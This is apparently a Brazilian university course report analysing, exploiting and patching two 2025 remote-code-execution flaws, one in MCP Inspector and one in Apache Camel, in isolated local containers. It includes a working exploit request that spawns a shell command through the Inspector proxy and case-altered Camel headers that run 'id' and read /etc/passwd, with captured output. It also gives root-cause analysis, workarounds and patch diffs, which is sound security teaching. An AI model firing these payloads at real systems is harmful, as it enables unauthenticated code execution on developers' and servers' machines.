---
title: "EP2 — Estudo, Exploração e Correção de Duas CVEs (2025)"
subtitle: "MAC0696 — Cibersegurança e Privacidade · IME-USP"
date: "2025"
lang: pt-BR
geometry: margin=2.3cm
fontsize: 11pt
---

<!--
  Rascunho do PDF (5–10 páginas). Converter com, por exemplo:
     pandoc pdf/relatorio.md -o relatorio.pdf --from gfm --pdf-engine=xelatex \
            --highlight-style=tango -V colorlinks=true
  As duas CVEs foram estudadas em ambiente 100% local e isolado (containers Docker).
-->

## Integrantes do trio

| Nome | Nº USP | Contribuição principal |
|------|--------|------------------------|
| _(preencher)_ | | |
| _(preencher)_ | | |
| _(preencher)_ | | |

## Resumo

Este trabalho estuda, explora e corrige duas vulnerabilidades de 2025, ambas levando a
**execução remota de código (RCE)**, mas por mecanismos bem diferentes:

- **CVE-2025-49596** — RCE **não-autenticado** no **MCP Inspector** (`< 0.14.1`), disparável
  por uma página web qualquer via CORS/DNS-rebinding contra o proxy local (CWE-306). É a
  vulnerabilidade da **demonstração ao vivo**.
- **CVE-2025-27636** — RCE no **Apache Camel** por **bypass do filtro de headers** devido a uma
  comparação case-sensitive, permitindo injetar headers de controle do componente `exec`.

Todo o ambiente roda em containers isolados, com portas publicadas apenas em `127.0.0.1`. Os
"payloads" apenas escrevem provas inócuas (`id`, `hostname`, leitura local de `/etc/passwd`)
dentro dos containers. Nenhum serviço externo é tocado. Os PoCs foram escritos pelo trio a
partir das *advisories* oficiais e das divulgações públicas, devidamente creditadas.

---

# Parte I — CVE-2025-49596 (MCP Inspector)

## 1.1 O serviço

O **MCP Inspector** é a ferramenta oficial de desenvolvimento do *Model Context Protocol* (MCP):
serve para inspecionar e testar servidores MCP localmente. Tem dois componentes:

- **Cliente (UI web)** em `http://localhost:6274`;
- **Proxy** (servidor Express) em `http://localhost:6277`, que fica entre a UI e os servidores
  MCP. No transporte `stdio`, "abrir um transporte" significa **executar um processo local** — o
  comando do servidor MCP. Essa capacidade é legítima e necessária; o problema é **quem pode
  acioná-la**.

| | |
|---|---|
| Produto | `@modelcontextprotocol/inspector` |
| Versões afetadas | `< 0.14.1` |
| Correção | `0.14.1` (commit `50df0e1`) |
| Classe | CWE-306 (Missing Authentication for Critical Function) + CORS/DNS-rebinding |
| CVSS (NVD) | 9.4 (crítico) |

## 1.2 Análise de causa-raiz (no código-fonte)

Arquivo **`server/src/index.ts`** (v0.14.0). Três fatos combinados produzem o RCE.

**(a) CORS totalmente liberado, sem allowlist de origem:**

```ts
const app = express();
app.use(cors());        // responde Access-Control-Allow-Origin: *
```

**(b) Endpoints que abrem transporte, SEM middleware de autenticação:**

```ts
app.get("/stdio", async (req, res) => { ... createTransport(req) ... });  // linha 273
app.get("/sse",   async (req, res) => { ... createTransport(req) ... });  // linha 323
```

São `GET` "simples" — o navegador nem dispara *preflight* CORS.

**(c) O sink: `createTransport` executa o comando vindo da query string:**

```ts
if (transportType === "stdio") {
  const command = query.command as string;                // controlado pelo atacante
  const origArgs = shellParseArgs(query.args as string);  // controlado pelo atacante
  const { cmd, args } = findActualExecutable(command, origArgs);
  const transport = new StdioClientTransport({ command: cmd, args, env, stderr: "pipe" });
  await transport.start();   // <-- SPAWN do processo do atacante
  return transport;
}
```

**Encadeamento:** `GET /sse?transportType=stdio&command=<X>&args=<Y>` → `createTransport` →
`StdioClientTransport(...).start()` → `spawn`. Quem controla a URL controla o processo
executado na máquina da vítima. Como não há token nem checagem de `Origin`, o proxy não
distingue a UI legítima de um site malicioso aberto noutra aba — é o padrão "0.0.0.0-day" /
DNS-rebinding contra ferramentas de dev que escutam em localhost.

## 1.3 Exploração

Dois vetores, mesma causa. A requisição mínima é apenas:

```
GET http://127.0.0.1:6277/sse?transportType=stdio&command=sh&args=-c%20"id%20>%20/evidence/proof.txt"
```

1. **`exploit.sh` (curl):** prova o núcleo do RCE direto no proxy.
2. **`attacker/index.html` + `exploit.js` (navegador):** a vítima só **abre a página**; o JS
   dispara um `fetch()` cross-origin ao proxy. Cenário realista da CWE-306 + CORS.

**Evidência capturada (alvo 0.14.0).** Saída do `exploit.sh` e log do proxy no mesmo instante:

```
[+] RCE CONFIRMADO — evidence/proof.txt:
    CVE-2025-49596 RCE PROOF via curl sem auth
    uid=0(root) gid=0(root) groups=0(root)
    0fe12792a275                                  (hostname do container)

# log do proxy:
Stdio transport: command=/usr/bin/sh, args=-c,echo ... ; id >> ... ; hostname >> ...
Spawned stdio transport
```

Replicando fielmente o `fetch()` do navegador (GET com `Origin: http://localhost:8080`), o
proxy respondeu **200**, devolveu `Access-Control-Allow-Origin: *` e criou o `proof.txt` — ou
seja, **basta visitar a página** para o comando rodar.

## 1.4 Workarounds paliativos (antes do patch)

Mapeiam 1:1 para as camadas que o patch oficializou; o ideal é combinar os três:

- **Bind só em loopback:** `HOST=127.0.0.1 npx @modelcontextprotocol/inspector` (e publicar
  portas apenas em `127.0.0.1`, como no nosso compose). Não protege do ataque pelo próprio
  navegador da vítima, mas tira o alvo da LAN.
- **Allowlist de `Origin` num reverse proxy** à frente do 6277 (ex.: nginx `if ($http_origin !~
  "^http://(localhost|127\.0\.0\.1):6274$") { return 403; }`).
- **Segredo compartilhado** (header `Authorization` exigido no reverse proxy).
- **Higiene:** não deixar o Inspector ligado em background; rodar sem privilégios; firewall local.

## 1.5 Correção definitiva (commit 50df0e1 → 0.14.1)

Defesa em profundidade, três camadas em `server/src/index.ts`:

```diff
# (1) bind local por padrão
-const server = app.listen(PORT);
+const HOST = process.env.HOST || '127.0.0.1';
+const server = app.listen(PORT, HOST);

# (2) token de sessão obrigatório (fecha o CWE-306)
+const sessionToken = randomBytes(32).toString('hex');
+const authMiddleware = (req, res, next) => {
+  if (authDisabled) return next();
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) { sendUnauthorized(); return; }
+  // ...comparação com crypto.timingSafeEqual(providedToken, sessionToken)...
+  next();
+};

# (3) validação de Origin (anti-DNS-rebinding)
+const originValidationMiddleware = (req, res, next) => {
+  const allowed = [`http://localhost:6274`, `http://127.0.0.1:6274`];
+  if (req.headers.origin && !allowed.includes(req.headers.origin)) {
+    res.status(403).json({ error: 'Forbidden - invalid origin' }); return;
+  }
+  next();
+};

-app.get("/sse", async (req, res) => { ... });
+app.get("/sse", originValidationMiddleware, authMiddleware, async (req, res) => { ... });
```

Aplicado a `/mcp`, `/stdio`, `/sse`, `/message` e `/config`. **Verificado (alvo 0.14.1):** o
mesmo `curl` sem token recebe **401 Unauthorized**; o mesmo `fetch()` do navegador (origem
`localhost:8080`) recebe **403 Forbidden - invalid origin**; nenhum `proof.txt` é criado.

---

# Parte II — CVE-2025-27636 (Apache Camel)

## 2.1 O serviço

O **Apache Camel** é um framework de integração: *rotas* ligam uma entrada (`from`) a
processadores/saídas (`to`) via componentes. Componentes **HTTP** (platform-http, camel-http,
jetty, netty-http, servlet…) recebem requisições externas; o componente **`exec`** executa
programas locais, configuráveis por **headers do exchange** (`CamelExecCommandExecutable`,
`CamelExecCommandArgs`, …). Para o cliente externo não injetar esses headers internos, os
componentes HTTP aplicam o **`DefaultHeaderFilterStrategy`**, que remove headers começando com
`Camel`/`org.apache.camel`. **Esse filtro é a fronteira de segurança.**

| | |
|---|---|
| Produto | Apache Camel (`camel-support`) |
| Versões afetadas | 3.10.0–3.22.3, 4.8.0–4.8.4, 4.10.0–4.10.1 |
| Correção | 3.22.4 / 4.8.5 / 4.10.2 (commit `781491b`) |
| Relacionada | **CVE-2025-29891** (mesma causa, via query/form params) |

## 2.2 Análise de causa-raiz (no código-fonte)

Arquivo **`DefaultHeaderFilterStrategy.java`**. O padrão de filtro é declarado
case-insensitive…

```java
public static final Pattern CAMEL_FILTER_PATTERN
        = Pattern.compile("(?i)(Camel|org\\.apache\\.camel)[.a-zA-z0-9]*");  // (?i) = ignore case
```

…mas um **atalho de performance** em `tryPattern` ignora o `(?i)` e compara case-sensitive:

```java
if (pattern == CAMEL_FILTER_PATTERN) {
    boolean match = headerName.startsWith("Camel") || headerName.startsWith("camel")
            || headerName.startsWith("org.apache.camel.");   // CASE-SENSITIVE — só esses prefixos
    if (match) return true;
    // nunca aplica o regex (?i): o atalho curto-circuita
} else if (pattern.matcher(headerName).matches()) { return true; }
```

Um header `CAmelExecCommandExecutable` (segundo caractere maiúsculo) não casa com `Camel` nem
`camel` → **não é filtrado**. E como os headers do `Message` vivem num `CaseInsensitiveMap`, o
componente `exec` ainda o resolve como `CamelExecCommandExecutable` e **sobrescreve o executável**.

> **Discrepância fatal:** o *filtro* é case-sensitive, mas o *consumo* é case-insensitive. Case
> torto passa pelo filtro e ainda é entendido pelo consumidor.

O caminho HTTP é afetado porque sua estratégia roda em modo lowerCase:

```java
public class PlatformHttpHeaderFilterStrategy extends DefaultHeaderFilterStrategy {
    protected void initialize() { setLowerCase(true); /* ... */ }
}
```

## 2.3 Exploração

Rota mínima: `from("platform-http:/run").to("exec:echo?args=rota-configurou-echo-benigno")`.
**Evidência capturada (Camel 4.8.4)** — saída real do `poc.sh`:

```
[2] 'CamelExecCommandExecutable: id'  (case canônico)             -> rota-configurou-echo-benigno   (FILTRADO)
[3] 'CAmelExecCommandExecutable: id' + 'CAmelExecCommandArgs: -a' -> uid=0(root) gid=0(root) groups=0(root)
[4] 'CAmelExecCommandExecutable: cat' + '...Args: /etc/passwd'    -> root:x:0:0:root:/root:/bin/bash ...
```

O caso [2] (case canônico) é barrado; os casos [3]/[4] (case torto) **executam o comando do
atacante** — o bypass → RCE.

**CVE-2025-29891 (relacionada).** Mesma causa-raiz, outra porta de entrada: componentes HTTP que
mapeiam **parâmetros de query/form** para headers permitem `?CAmelExecCommandExecutable=...`
direto na URL, alcançando o mesmo sink. O mesmo commit corrige ambas.

## 2.4 Workarounds paliativos

- **Correção definitiva:** atualizar para 3.22.4 / 4.8.5 / 4.10.2+.
- **Não expor componentes sensíveis** (`exec`, SpEL, etc.) diretamente atrás de HTTP.
- Logo após o `from`, aplicar `removeHeaders("Camel*")` ou uma **allowlist explícita** dos
  headers aceitos; filtrar também parâmetros de query (cobre a CVE-2025-29891).

## 2.5 Correção definitiva (commit 781491b)

O patch restaura o case-insensitive no caminho `lowerCase`:

```diff
 if (pattern == CAMEL_FILTER_PATTERN) {
     boolean match = headerName.startsWith("Camel") || headerName.startsWith("camel")
             || headerName.startsWith("org.apache.camel.");
     if (match) return true;
+    if (lowerCase) {
+        if (lower == null) lower = headerName.toLowerCase();
+        match = lower.startsWith("camel") || lower.startsWith("org.apache.camel.");
+        if (match) return true;
+    }
 } else if (pattern.matcher(headerName).matches()) { return true; }
```

Agora `CAmelExecCommandExecutable` → `camelexeccommandexecutable` → casa com `camel` → é
filtrado. A mesma correção vai para `evalFilterMatch`. **Verificado (Camel 4.8.5):** o mesmo
ataque [3]/[4] passa a retornar o `echo` benigno — neutralizado.

---

# Parte III — Comparação e conclusão

| | CVE-2025-49596 (MCP Inspector) | CVE-2025-27636 (Apache Camel) |
|---|---|---|
| Falha | Função crítica (spawn) **sem autenticação** | Filtro **case-sensitive** por engano |
| Gatilho | 1 GET cross-origin (navegador/curl) | 1 header HTTP com case torto |
| Pré-condição | Inspector `<0.14.1` rodando local | Rota Camel com `exec` atrás de HTTP |
| Correção | token + validação de origem + bind local | lowercasing antes do `startsWith` |
| Lição | isolar não basta: autenticar quem aciona | otimização quebrou invariante de segurança |

Ambas mostram um mesmo padrão de fundo: **uma capacidade poderosa e legítima** (spawn de
processo; execução via `exec`) fica a **uma falha de controle de acesso de distância** de virar
RCE. Em nenhum dos casos a correção remove a capacidade — ela conserta *quem/como* pode acioná-la.

# Créditos e referências

- **CVE-2025-49596:** advisory GHSA-7f8r-222p-6f5g (`modelcontextprotocol/inspector`);
  divulgação/pesquisa original **Oligo Security** (relatório público "MCP Inspector RCE", 2025);
  patch commit `50df0e1ec488f3983740b4d28d2a968f12eb8979`.
- **CVE-2025-27636 / CVE-2025-29891:** advisories oficiais do Apache Camel; patch commit
  `781491b446921341f87a13824be4f7b5063776fc` (CAMEL-21828, Claus Ibsen).
- Trechos de código citados das versões vulneráveis (`inspector@0.14.0`, `camel-4.10.1`/`4.8.4`)
  e dos diffs dos patches.
- Os PoCs (página atacante, `exploit.sh`, `poc.sh`, rota Camel) foram **escritos pelo trio** a
  partir dessas fontes; **nenhum código de PoC de terceiros foi copiado**. As técnicas são as
  descritas nas advisories.
